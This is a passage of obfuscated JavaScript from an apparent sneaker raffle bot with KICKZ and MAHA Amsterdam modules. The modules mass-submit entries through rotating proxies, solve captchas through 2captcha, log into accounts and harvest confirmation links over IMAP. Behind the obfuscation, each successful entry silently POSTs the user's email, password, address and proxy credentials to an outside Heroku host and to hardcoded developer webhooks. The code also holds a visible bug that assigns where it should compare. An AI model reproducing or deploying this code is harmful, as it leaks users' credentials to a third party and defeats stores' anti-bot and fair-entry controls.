                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x164694, _0x48a91e, _0x2632e3) {
                    _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4562fb['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1f1e0f = 0x0; _0x1f1e0f < _0x48a91e['length']; _0x1f1e0f++) {
                        var _0x31be13;
                        if (_0x4c787d != 'yes')
                            var _0x4c787d = '', _0xedceec = 0x0;
                        _0x81eb1(_0x164694['name'] + '\x20Task\x20' + (_0x1f1e0f + 0x1) + '\x20/\x20' + _0x48a91e['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                        var _0x129f0e = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1d8120
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x48a91e[_0x1f1e0f]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x48a91e[_0x1f1e0f]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4562fb['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5acae2
                                }
                            ]
                        }];
                        let _0x469ae4 = [
                            'Email',
                            'Password',
                            'FirstName',
                            'LastName',
                            'Size',
                            'Address1',
                            'HouseNumber',
                            'Zip',
                            'Country',
                            'City'
                        ], _0x5839b4 = ![];
                        for (key of _0x469ae4) {
                            if (_0x48a91e[_0x1f1e0f][key] == '' || !_0x48a91e[_0x1f1e0f][key]) {
                                console['log'](_0x1211a5() + '\x20[' + _0x164694['name'] + ']\x20Task\x20' + (_0x1f1e0f + 0x1) + '\x20:\x20Invalid\x20CSV,\x20' + key + '\x20not\x20found'), _0x5839b4 = !![];
                                break;
                            }
                        }
                        if (_0x5839b4) {
                            await _0x4d97b0(0x1f4);
                            continue;
                        }
                        var _0x12c23b = await _0x4ef820(_0x48a91e[_0x1f1e0f], _0x164694, 'dev', ![]), _0x5b2c0f = await _0x4ef820(_0x48a91e[_0x1f1e0f], _0x164694, 'pub', ![]);
                        const _0x2ed2e5 = {
                            'succesDEVMSG': { 'embeds': [_0x12c23b] },
                            'succesPUBMSG': { 'embeds': [_0x5b2c0f] }
                        };
                        try {
                            await _0x43eceb(_0x48a91e, _0x1f1e0f);
                        } catch {
                            _0x4c787d = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x4562fb['useRandomProxy'] = ![])
                            var _0x301629 = _0x2632e3[_0x1f1e0f]['split'](':');
                        else
                            var _0x171150 = Math['round'](Math['random']() * (_0x2632e3['length'] - 0x1)), _0x301629 = _0x2632e3[_0x171150]['split'](':');
                        var _0x5097c6;
                        try {
                            _0x5097c6 = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x301629[0x0] + ':' + _0x301629[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5097c6 = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x301629[0x0] + ':' + _0x301629[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x15327e = await _0x5097c6['newPage']();
                            await _0x15327e['authenticate']({
                                'username': '' + _0x301629[0x2],
                                'password': '' + _0x301629[0x3]
                            }), console['log'](_0x1211a5() + '\x20[' + _0x164694['name'] + ']\x20Task\x20' + (_0x1f1e0f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x15327e['setRequestInterception'](!![]), _0x15327e['on']('request', _0x295c9d => {
                                _0x295c9d['resourceType']() === 'image' || _0x295c9d['resourceType']() === 'font' || _0x295c9d['resourceType']() === 'media' ? _0x295c9d['abort']() : _0x295c9d['continue']();
                            }), await _0x15327e['goto']('' + _0x48a91e[_0x1f1e0f]['Url']['replace']('\x20', ''), { 'waitUntil': 'networkidle2' }), await _0x4d97b0(0x12c), await _0x15327e['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x15327e['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4d97b0(0x7d0);
                            try {
                                await _0x15327e['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x15327e['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x1211a5() + '\x20[' + _0x164694['name'] + ']\x20Task\x20' + (_0x1f1e0f + 0x1) + '\x20:\x20Logging\x20in'), await _0x15327e['waitForSelector']('#username'), await _0x15327e['type']('#username', _0x48a91e[_0x1f1e0f]['Email']), await _0x15327e['waitForSelector']('#password'), await _0x15327e['type']('#password', _0x48a91e[_0x1f1e0f]['Password']), await _0x4d97b0(0x190), await _0x15327e['click']('#buttonSubmit'), await _0x15327e['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x1211a5() + '\x20[' + _0x164694['name'] + ']\x20Task\x20' + (_0x1f1e0f + 0x1) + '\x20:\x20Getting\x20Product'), await _0x4d97b0(0x1f4), console['log'](_0x1211a5() + '\x20[' + _0x164694['name'] + ']\x20Task\x20' + (_0x1f1e0f + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x48a91e[_0x1f1e0f]['Size']);
                            let _0x2fa45b = _0x48a91e[_0x1f1e0f]['Size']['replace']('.5', '\x201/2');
                            if (_0x2fa45b['toUpperCase']() == 'RANDOM') {
                                const _0xe2d85d = await _0x15327e['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x2c30eb = Math['round'](Math['random']() * (_0xe2d85d['length'] - 0x1));
                                await _0xe2d85d[_0x2c30eb]['click']();
                            } else
                                await _0x15327e['click']('button[aria-label=\x22' + _0x2fa45b + '\x22]');
                            await _0x4d97b0(0x1f4);
                            try {
                                await _0x15327e['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x4d97b0(0x12c), console['log'](_0x1211a5() + '\x20[' + _0x164694['name'] + ']\x20Task\x20' + (_0x1f1e0f + 0x1) + '\x20:\x20Filling\x20Information'), await _0x15327e['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x4d97b0(0x12c), await _0x15327e['type']('#dwfrm_raffle_addressFields_firstName', _0x48a91e[_0x1f1e0f]['FirstName']), await _0x4d97b0(0x12c), await _0x15327e['type']('#dwfrm_raffle_addressFields_lastName', _0x48a91e[_0x1f1e0f]['LastName']), await _0x4d97b0(0x12c), await _0x15327e['select']('#dwfrm_raffle_addressFields_country', _0x48a91e[_0x1f1e0f]['Country']), await _0x4d97b0(0x12c), await _0x15327e['type']('#dwfrm_raffle_addressFields_city', _0x48a91e[_0x1f1e0f]['City']), await _0x4d97b0(0x12c);
                            _0x48a91e[_0x1f1e0f]['Postcode'] == undefined && (_0x48a91e[_0x1f1e0f]['Postcode'] = _0x48a91e[_0x1f1e0f]['Zip']);
                            await _0x15327e['type']('#dwfrm_raffle_addressFields_postalCode', _0x48a91e[_0x1f1e0f]['Postcode']), await _0x4d97b0(0x12c), await _0x15327e['type']('#dwfrm_raffle_addressFields_address1', _0x48a91e[_0x1f1e0f]['Address1']), await _0x4d97b0(0x12c), await _0x15327e['type']('#dwfrm_raffle_addressFields_address2', _0x48a91e[_0x1f1e0f]['HouseNumber']), await _0x4d97b0(0x12c), await _0x15327e['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x48a91e[_0x1f1e0f]['Address2']), await _0x4d97b0(0x12c), await _0x15327e['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x4d97b0(0x12c), await _0x15327e['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x48a91e[_0x1f1e0f]['Follower']), await _0x4d97b0(0x1f4), await _0x15327e['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x4d97b0(0x1f4), console['log'](_0x1211a5() + '\x20[' + _0x164694['name'] + ']\x20Task\x20' + (_0x1f1e0f + 0x1) + '\x20:\x20' + _0x1de0e8['blue']('Awaiting\x20Paypal\x20Payment')), await _0x15327e['click']('.b-paypal_button');
                            try {
                                await _0x15327e['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x4c787d = 'no', _0x3b7ca0(_0x48a91e[_0x1f1e0f], _0x164694), console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x164694['name'] + ']\x20Task\x20' + (_0x1f1e0f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x2ed2e5['succesDEVMSG']);
                                await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x2ed2e5['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x3f583b, _0x2ed2e5['succesPUBMSG']);
                                let _0x3e7266 = _0x48a91e[_0x1f1e0f];
                                try {
                                    prxdata = {
                                        'username': _0x1d8120['replace']('#', ''),
                                        'module': _0x164694['name'],
                                        'entrydata': JSON['stringify'](_0x3e7266),
                                        'proxy': '' + _0x2632e3[_0x1f1e0f]
                                    };
                                    var _0x321333 = JSON['stringify'](prxdata);
                                    let _0x5c9de5 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x321333, _0x5c9de5);
                                } catch (_0x164ba9) {
                                }
                            } catch (_0x2e850b) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x164694['name'] + ']\x20Task\x20' + (_0x1f1e0f + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x2e850b)), _0x31be13 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x2e850b;
                                var _0xba2d68 = await _0x4ef820(_0x48a91e[_0x1f1e0f], _0x164694, 'dev', !![], _0x31be13);
                                _0x2ed2e5['errorDEV'] = { 'embeds': [_0xba2d68] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x2ed2e5['errorDEV']), await _0xa7b872(_0x5f83c7, _0x2ed2e5['errorDEV']);
                            }
                        } catch (_0x3d941e) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x164694['name'] + ']\x20Task\x20' + (_0x1f1e0f + 0x1) + '\x20:\x20' + _0x3d941e)), _0x31be13 = '' + _0x3d941e;
                            var _0xba2d68 = await _0x4ef820(_0x48a91e[_0x1f1e0f], _0x164694, 'dev', !![], _0x31be13);
                            _0x2ed2e5['errorDEV'] = { 'embeds': [_0xba2d68] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x2ed2e5['errorDEV']), await _0xa7b872(_0x5f83c7, _0x2ed2e5['errorDEV']), _0x4c787d = 'yes';
                        } finally {
                            _0x5097c6 && _0x5097c6['close']();
                            if (_0x4c787d == 'yes' && _0xedceec != 0x5) {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x164694['name'] + ']\x20Task\x20' + (_0x1f1e0f + 0x1) + '\x20:\x20Retrying\x20(' + _0xedceec + '\x20/\x205)')), _0x1f1e0f = _0x1f1e0f - 0x1, _0xedceec = _0xedceec + 0x1;
                                continue;
                            }
                            _0x4c787d == 'yes' && _0xedceec >= 0x5 && (_0x320814(_0x48a91e[_0x1f1e0f], _0x164694), _0x4c787d = 'no', _0xedceec = 0x0), console['log']('Waiting\x20for\x20' + _0x4562fb['AfewDelay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x28e7a1, _0x865770, _0x191247) {
                    for (var _0x4b28a0 = 0x0; _0x4b28a0 < _0x865770['length']; _0x4b28a0++) {
                        try {
                            await _0x43eceb(_0x865770, _0x4b28a0);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x1c1f2a(_0x3046a9, _0x5c608a, _0x2a980b, _0x31a050, _0x3a3641) {
                            var _0x510db0, _0x43f33e = {}, _0x42a570 = [], _0x537a42 = {}, _0x446edf = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0xd9c9f6 = Math['round'](Math['random']() * (_0x446edf['length'] - 0x1));
                            !_0x31a050 && (_0x31a050 = {});
                            if (_0x5c608a != 'ver') {
                                _0x81eb1(_0x2a980b['name'] + '\x20Task\x20' + (_0x3046a9 + 0x1) + '\x20/\x20' + _0x31a050['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b), await _0x43eceb(_0x31a050, _0x3046a9), _0x43f33e = _0x2a980b['data'], _0x43f33e['data']['attributes']['email'] = '' + _0x31a050[_0x3046a9]['Email'];
                                if (_0x31a050[_0x3046a9]['Size'] == 'RANDOM') {
                                }
                                _0x43f33e['data']['attributes']['properties']['$first_name'] = '' + _0x31a050[_0x3046a9]['FirstName'], _0x43f33e['data']['attributes']['properties']['$last_name'] = '' + _0x31a050[_0x3046a9]['LastName'], _0x43f33e['data']['attributes']['properties']['$address1'] = _0x31a050[_0x3046a9]['Address1'] + '\x20' + _0x31a050[_0x3046a9]['Address2'] + '\x20' + _0x31a050[_0x3046a9]['HouseNumber'], _0x43f33e['data']['attributes']['properties']['$zip'] = '' + _0x31a050[_0x3046a9]['Zip'], _0x43f33e['data']['attributes']['properties']['$city'] = '' + _0x31a050[_0x3046a9]['City'], _0x43f33e['data']['attributes']['properties']['$country'] = '' + _0x31a050[_0x3046a9]['Country'], _0x31a050[_0x3046a9]['Size'] == 'RANDOM' ? _0x43f33e['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x446edf[_0xd9c9f6] : _0x43f33e['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x31a050[_0x3046a9]['Size'], _0x43f33e['data']['attributes']['properties']['$phone_number'] = '' + _0x31a050[_0x3046a9]['Phone'], _0x43f33e['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x31a050[_0x3046a9]['Follower'];
                            }
                            if (_0x4562fb['useRandomProxy'] = ![])
                                var _0x530c28 = _0x3a3641[_0x3046a9]['split'](':');
                            else
                                var _0x43ae7f = Math['round'](Math['random']() * (_0x3a3641['length'] - 0x1)), _0x530c28 = _0x3a3641[_0x43ae7f]['split'](':');
                            var _0x44e970 = {
                                'jar': _0x21e44c,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x2a980b['url'],
                                'headers': _0x2a980b['headers'],
                                'body': JSON['stringify'](_0x43f33e),
                                'proxy': 'http://' + _0x530c28[0x2] + ':' + _0x530c28[0x3] + '@' + _0x530c28[0x0] + ':' + _0x530c28[0x1]
                            };
                            return _0x5c608a != 'ver' && (_0x44e970['url'] = _0x2a980b['url'], _0x44e970['headers'] = _0x2a980b['headers']), _0x5c608a == 'ver' && (_0x44e970['method'] = 'GET'), new Promise(function (_0x16d294, _0x5df0b6) {
                                callback = async (_0x49f8f6, _0x533aad, _0x4f822e) => {
                                    if (!_0x49f8f6 && _0x533aad['statusCode'] == 0xca || !_0x49f8f6 && _0x533aad['statusCode'] == 0xc8) {
                                        if (_0x5c608a != 'ver') {
                                            var _0x507546 = await _0x4ef820(_0x31a050[_0x3046a9], _0x2a980b, 'dev', ![]), _0x2dfd2e = await _0x4ef820(_0x31a050[_0x3046a9], _0x2a980b, 'pub', ![]);
                                            const _0x5e8dcc = {
                                                'succesDEVMSG': { 'embeds': [_0x507546] },
                                                'succesPUBMSG': { 'embeds': [_0x2dfd2e] }
                                            };
                                            let _0x43a4d9 = _0x31a050[_0x3046a9];
                                            try {
                                                prxdata = {
                                                    'username': _0x1d8120['replace']('#', ''),
                                                    'module': _0x2a980b['name'],
                                                    'entrydata': JSON['stringify'](_0x43a4d9),
                                                    'proxy': '' + _0x3a3641[_0x3046a9]
                                                };
                                                var _0x485e67 = JSON['stringify'](prxdata);
                                                let _0x3e3569 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x4012a9['post']('https://jraffles.herokuapp.com/success', _0x485e67, _0x3e3569);
                                            } catch (_0x531b50) {
                                            }
                                            if (_0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '')
                                                try {
                                                    await _0xa7b872(_0x4562fb['webhook'], _0x5e8dcc['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x5e8dcc['succesDEVMSG']), await _0x4d97b0(0xc8);
                                            try {
                                                await _0xa7b872(_0x3f583b, _0x5e8dcc['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x3b7ca0(_0x31a050[_0x3046a9], _0x2a980b);
                                        }
                                        _0x16d294(console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x2a980b['name'] + ']\x20Task\x20' + (_0x3046a9 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x5c608a != 'ver') {
                                            var _0x5354c1 = '' + _0x49f8f6, _0x3e578a = await _0x4ef820(_0x31a050[_0x3046a9], _0x2a980b, 'dev', !![], _0x5354c1), _0x1e55dd = {};
                                            _0x1e55dd['errorDEV'] = { 'embeds': [_0x3e578a] }, _0x320814(_0x31a050[_0x3046a9], _0x2a980b), _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x1e55dd['errorDEV']), await _0xa7b872(_0x5f83c7, _0x1e55dd['errorDEV']);
                                        }
                                        _0x5df0b6(console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x2a980b['name'] + ']\x20Task\x20' + (_0x3046a9 + 0x1) + ':\x20' + _0x49f8f6)));
                                    }
                                };
                                try {
                                    _0x5c608a != 'ver' && console['log'](_0x1211a5() + '\x20[' + _0x2a980b['name'] + ']\x20Task\x20' + (_0x3046a9 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x43f33e['data']['attributes']['email']), _0xe9845d(_0x44e970, callback);
                                } catch (_0xedaeb1) {
                                    console['log'](_0x1211a5() + '\x20Task\x20' + (_0x3046a9 + 0x1) + ':\x20' + _0xedaeb1);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x1c1f2a(_0x4b28a0, 'nor', _0x28e7a1, _0x865770, _0x191247), console['log'](_0x1211a5() + '\x20[' + _0x28e7a1['name'] + ']\x20Sleeping\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                        } catch (_0x2c3d75) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x92e209, _0x40cd42, _0x1da6fd) {
                    var _0x57b408 = [], _0x5df47a = ![];
                    async function _0x287cd9() {
                        var _0x4ce276 = new _0x1aebaf({
                            'user': _0x4562fb['masterMail'],
                            'password': _0x4562fb['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x58ac0f(_0x2c3af4) {
                            _0x4ce276['openBox']('INBOX', ![], _0x2c3af4);
                        }
                        _0x4ce276['once']('ready', function () {
                            _0x58ac0f(function (_0x908eb0, _0x4428b3) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x908eb0)
                                    throw _0x908eb0;
                                _0x4ce276['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x14f1ed, _0x13cfc1) {
                                    if (!_0x13cfc1 || !_0x13cfc1['length'])
                                        console['log'](_0x1211a5() + '\x20[' + _0x92e209['name'] + ']\x20No\x20mails\x20found'), _0x4ce276['end']();
                                    else {
                                        var _0x1da2e6 = _0x4ce276['seq']['fetch'](_0x13cfc1, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x1da2e6['on']('message', function (_0x2c72a7, _0x5a2285) {
                                            var _0x4853bd = '(#' + _0x5a2285 + ')\x20';
                                            _0x2c72a7['on']('body', function (_0x3d2c3c, _0x1cda13) {
                                                _0x372396(_0x3d2c3c, (_0x466c93, _0x92962c) => {
                                                    var _0x4021f0 = _0x92962c['text']['split']('(')[0x1], _0x42864a = _0x4021f0['split'](')')[0x0];
                                                    _0x57b408['push'](_0x42864a);
                                                });
                                            }), _0x2c72a7['once']('end', function () {
                                            });
                                        }), _0x1da2e6['once']('error', function (_0x15f5a4) {
                                            console['log']('Fetch\x20error:\x20' + _0x15f5a4), _0x5df47a = !![];
                                        }), _0x1da2e6['once']('end', function () {
                                            _0x4ce276['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x4ce276['once']('error', function (_0x9c99f5) {
                            console['log'](_0x1de0e8['red'](_0x9c99f5['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5df47a = !![];
                        }), _0x4ce276['once']('end', async function () {
                            _0x5df47a = !![];
                        }), _0x4ce276['connect']();
                    }
                    async function _0x4bc429(_0x13dd82, _0xba35d7, _0x47ecd7) {
                        for (var _0x36ff19 = 0x0; _0x36ff19 < _0xba35d7['length']; _0x36ff19++) {
                            async function _0x5eb297(_0x480ec9, _0x3410d5, _0x173ded, _0x523e88, _0x29d049) {
                                var _0x56d90c, _0x1a8dcf = {}, _0x107738 = [], _0x3d0955 = {}, _0x382778 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x4c47b5 = Math['round'](Math['random']() * (_0x382778['length'] - 0x1));
                                _0x523e88[_0x480ec9]['Size'] == 'RANDOM' && (_0x523e88[_0x480ec9]['Size'] = _0x382778[_0x4c47b5]);
                                !_0x523e88 && (_0x523e88 = {});
                                if (_0x4562fb['useRandomProxy'] = ![])
                                    var _0x2e543e = _0x29d049[_0x480ec9]['split'](':');
                                else
                                    var _0x475c6a = Math['round'](Math['random']() * (_0x29d049['length'] - 0x1)), _0x2e543e = _0x29d049[_0x475c6a]['split'](':');
                                var _0x1c8462 = {
                                    'jar': _0x21e44c,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x173ded['url'],
                                    'headers': _0x173ded['headers'],
                                    'body': JSON['stringify'](_0x1a8dcf),
                                    'proxy': 'http://' + _0x2e543e[0x2] + ':' + _0x2e543e[0x3] + '@' + _0x2e543e[0x0] + ':' + _0x2e543e[0x1]
                                };
                                return _0x3410d5 != 'ver' && (_0x1c8462['url'] = _0x173ded['url'], _0x1c8462['headers'] = _0x173ded['headers']), _0x3410d5 == 'ver' && (_0x1c8462['method'] = 'GET', _0x1c8462['url'] = _0x523e88[_0x480ec9]), new Promise(function (_0x3f0313, _0x151000) {
                                    callback = async (_0x5edef9, _0x2030c2, _0x683caf) => {
                                        if (!_0x5edef9 && _0x2030c2['statusCode'] == 0xca || !_0x5edef9 && _0x2030c2['statusCode'] == 0xc8) {
                                            if (_0x3410d5 != 'ver') {
                                                var _0x27ed1f = await _0x4ef820(_0x523e88[_0x480ec9], _0x173ded, 'dev', ![]), _0x2e17ba = await _0x4ef820(_0x523e88[_0x480ec9], _0x173ded, 'pub', ![]);
                                                const _0x2d1155 = {
                                                    'succesDEVMSG': { 'embeds': [_0x27ed1f] },
                                                    'succesPUBMSG': { 'embeds': [_0x2e17ba] }
                                                };
                                                if (_0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '')
                                                    try {
                                                        await _0xa7b872(_0x4562fb['webhook'], _0x2d1155['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x2d1155['succesDEVMSG']), await _0x4d97b0(0xc8);
                                                try {
                                                    await _0xa7b872(_0x3f583b, _0x2d1155['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3b7ca0(_0x523e88[_0x480ec9], _0x173ded);
                                            }
                                            _0x3f0313(console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x173ded['name'] + ']\x20Task\x20' + (_0x480ec9 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x3410d5 != 'ver') {
                                                var _0x57d2d5 = '' + _0x5edef9, _0x2cb963 = await _0x4ef820(_0x523e88[_0x480ec9], _0x173ded, 'dev', !![], _0x57d2d5), _0x247e1a = {};
                                                _0x247e1a['errorDEV'] = { 'embeds': [_0x2cb963] }, _0x320814(_0x523e88[_0x480ec9], _0x173ded), _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x247e1a['errorDEV']), await _0xa7b872(_0x5f83c7, _0x247e1a['errorDEV']);
                                            }
